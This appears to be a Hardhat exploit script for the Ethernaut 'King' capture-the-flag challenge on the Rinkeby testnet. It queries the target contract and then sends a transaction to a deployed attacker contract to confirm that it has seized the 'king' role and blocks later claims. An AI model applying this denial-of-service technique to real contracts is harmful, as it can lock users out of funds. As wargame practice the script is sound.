import { ethers } from "hardhat"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0xB91E5F2db49750638e3F4E757Fb633794267b558"
  const targetAbi = [
    {
      inputs: [],
      stateMutability: "payable",
      type: "constructor",
      payable: true,
    },
    {
      inputs: [],
      name: "_king",
      outputs: [
        {
          internalType: "address payable",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x29cc6d6f",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address payable",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
    {
      inputs: [],
      name: "prize",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xe3ac5d26",
    },
    {
      stateMutability: "payable",
      type: "receive",
      payable: true,
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("King")
  console.log(`King status before ${await target._king()}`)
  console.log(`Prize status before ${await target.prize()}`)

  // const tx = await contract.pwn(targetAddress, { value: 10 })

  // proof
  const tx = await deployer.sendTransaction({
    to: contract.address,
    value: 10,
    gasLimit: 1000000,
  })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://rinkeby.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log(`King status ${await target._king()}`)
  console.log(`Prize status ${await target.prize()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
